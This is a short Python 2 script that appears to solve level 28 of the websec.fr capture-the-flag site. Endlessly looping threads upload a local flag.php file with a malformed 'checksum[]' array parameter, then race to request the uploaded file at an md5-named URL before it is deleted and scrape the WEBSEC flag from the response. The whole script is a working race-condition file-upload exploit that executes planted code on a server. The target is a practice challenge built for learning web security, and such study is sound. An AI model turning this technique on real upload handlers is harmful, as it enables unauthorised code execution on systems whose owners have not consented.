import requests
import sys
import re
import threading

def sendFile():
    mainPage    = "http://websec.fr/level28/index.php"
    UPLOAD_FILE = "Level28.txt"
    DATA1       = {"flag_file":open('/Users/maikpedia/CTF/OSWE/websec-notes/LEVEL-28/flag.php',"rb")}
    DATA2       = {"checksum[]":"","submit":"Upload and check"}
    r = requests.post(mainPage,data=DATA2, files=DATA1)

def webShell():
    md5file = "http://websec.fr/level28/adcd78523e501c0b77a3210a56c65b7f.php"
    r = requests.get(md5file)
    print re.findall("WEBSEC[{].*[}]",r.text)

while True:
    process1 = threading.Thread(target=sendFile)
    process1.start()
    process2 = threading.Thread(target=webShell)
    process2.start()